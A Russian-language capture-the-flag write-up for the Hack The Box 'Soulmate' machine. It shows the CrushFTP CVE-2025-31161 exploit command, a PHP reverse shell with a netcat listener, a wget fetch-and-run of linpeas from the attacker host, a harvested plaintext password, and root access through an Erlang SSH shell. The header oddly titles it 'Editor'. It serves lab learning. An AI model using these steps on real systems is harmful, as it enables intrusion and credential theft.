# 📝 Write-up: Editor (Hack The Box)

![editor](https://app.hackthebox.com/machines/Soulmate)

**Difficulty:** Easy
**Platform:** Hack The Box
**Target host (lab):** `soulmate.htb` — `10.10.11.86 ` (add to `/etc/hosts`)
**Link:** [Soulmate @ HTB](https://app.hackthebox.com/machines/Soulmate)

---

## 🎯 Summary

Soulmate — лёгкая Linux-машина. Ключевые шаги:

* Инициальный доступ через **уязвимость аутентификации в CrushFTP версии до 11.3.1** CVE-2025-31161 (или 2825, Immersive Labs PoC).
* Горизонтальная эскалация: переиспользование пароля из конфигурации.
* Эскалация до root через небезопасную конфигурацию Erlang/OTP ssh демона
---

## 📋 Table of Contents



---

## 🔒 Prerequisites / Notes

* Это write-up для учебной (CTF/lab) среды Hack The Box — **не запускать против продакшн-систем**.
* В моих примерах `soulmate.htb` резолвится в `10.10.11.86`. Добавьте в `/etc/hosts`:

```bash
# add on атакующей машине
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```

* Я удалил явные плейсхолдеры и указал, где подставлять свои значения: `<YOUR_IP>` — IP вашей атакующей машины для обратного шелла.

---

## 🔍 Reconnaissance

Сначала  порт-скан `nmap`:

```bash
nmap -sC -sV -p22,80,443,20 soulmate.htb
```

Пример вывода (сокращённо):
```
PORT    STATE SERVICE   VERSION
20/tcp  open  ftp-data?
22/tcp  open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp  open  http?
443/tcp open  https?
```

---

## 🕵️ Enumeration

### 🌐 HTTP — порт 80

* При переходе на страницу http://soulmate.htb в браузере показался сайт для знакомств.
Я запустил ffuf для поиска директорий, результаты:

```
index.php               [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 687ms]
login.php               [Status: 200, Size: 8554, Words: 3167, Lines: 178, Duration: 67ms]
register.php            [Status: 200, Size: 11107, Words: 4492, Lines: 238, Duration: 72ms]
profile.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 65ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 133ms]
```
При попытке залогинитья с помощью sql запросов сервер вел себя странно 
![Страноость] (imageSql.php)
* Это мы запонимаем и копаем дальше


### 🌐 Порт 20 - FTP

* К порту `20` не получилось подключиться
* Запускаем  опять ffuf для поиска субдоменов 

```bash
ffuf -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb"  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
```
* Результаты 
```
ftp.soulmate.htb [Status: 302 Redirect]
```
<!-- Не забываем  -->
echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts

### ⚡ Порт 20 — CrushFTP Version: 11.3.0_2

* Обнаружен интерфейс со страницей логина и версия CrushFTP ; найдены уязвимости для этой версии  `crushftp-CVE-2025-2825   --> https://github.com/punitdarji/crushftp-CVE-2025-2825/blob/main/payload ` и `CVE-2025-31161 -->  https://github.com/Immersive-Labs-Sec/CVE-2025-31161`

* crushftp-CVE-2025-2825 с его помощью я получили список юзеров админ панели
![Список_юзеров] (image1.phg)

* С помощью CVE-2025-31161 получилось от имени рута(root) создать нового пользователя без аутентификации.
```bash
python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user xss --password xss123
```
* Получилось войти в систему как xss
![Админ_авпель] (image2.png)

* Потыкав на странице ` http://ftp.soulmate.htb/WebInterface/UserManager/index.htm` я обнаружил список юзеров

* Я изменил их пароли и вошел в систему, только у bena были обраружены интересные директории с файлами
![ben] (image3.png)
```
/IT/ – Файлы информационных технологий
/ben/ – Пользовательская директория
/webProd/ – Директория веб-продукции (целевая для загрузки файлов)
```

* Я загрузил на webProd monkey.php для получения обратной оболочки 
* На другом терминале я запустил netcat для установки соединения
```bash
nc -lnvp 4444
```
* После загрузки php файла переходим по адресу `http://soulmate.htb/monkey.php`
* Бинго у нас обратная оболочка !

### Получение обратной оболочки
```bash
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.184] from (UNKNOWN) [10.10.11.86] 44832
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

## Перечисление системы 
* В первую очередь я открыл у себя простой http-server
```bash
python3 -m http.server 8000
```
* А на целевой машине я загрузил и исполнил linpeas.sh
```bash
cd /tmp/
wget http://10.10.14.184:8000/linpeas.sh -O lin.sh
chmod +x lin.sh
./lin.sh
```

### Обнаружение интересного процесса 
```bash
root  1048  0.0  1.8 2260044 72276 ? Ssl 16:06 0:03 /usr/local/lib/erlang_login/start.escript -B
```

* При изучении скрипта я нашел конфиденциональные данные юзера ben
```bash
cat /usr/local/lib/erlang_login/start.escript
.......
{auth_methods, "publickey,password"},
{user_passwords, [{"ben", "HouseH0ldings998"}]}

```

### Получение user.txt

* Я подключился по ssh используя креды юзера ben
```bash
ssh ben@soulmate
Password: HouseH0ldings998
```
* Первый флаг готов
```bash
ben@soulmate:~$ cat user.txt
81b8219692204e627f7e41a11e42b26b
```

## Эскалация привелегий до рута 

* Я провеил свои права через `sudo -l`
```bash
ben@soulmate:~$ sudo -l
[sudo] password for ben:
Sorry, user ben may not run sudo on soulmate.
```

* Хорошо а как насчет активных портов 
![Порты] (image4.png)

### Обнаружение подозрительного  процесса на порту 2222

* Это была служба Erlang SSH, запущенная на порту 2222 от рута
* Я попытылся используя учетные данные bena переподключиться по localhostу с помощью ssh
```bash
ben@soulmate:~$ ssh ben@localhost -p 2222
Password: HouseH0ldings998
```
* Я получил оболочку 
```bash
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```
* Я исользуя chatGPT понял как рабоать с этой оболочкой 
```bash
(ssh_runner@soulmate)1> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```

### Чтение флага root.txt
```bash
(ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").
```
![root.txt] (image.png)
 

 ## Заклюючение 
 *     "Soulmate" на HackTheBox — отличный вариант для тех, кто только начинает разбираться в пентесте. На этой машине ты на практике изучишь основы взлома веб-приложений, работу с реверс-шеллами и способы получения прав root.

    Спасибо, что дочитали! Надеюсь, этот гайд оказался полезным и поможет тебе покорять другие хакерские полигоны.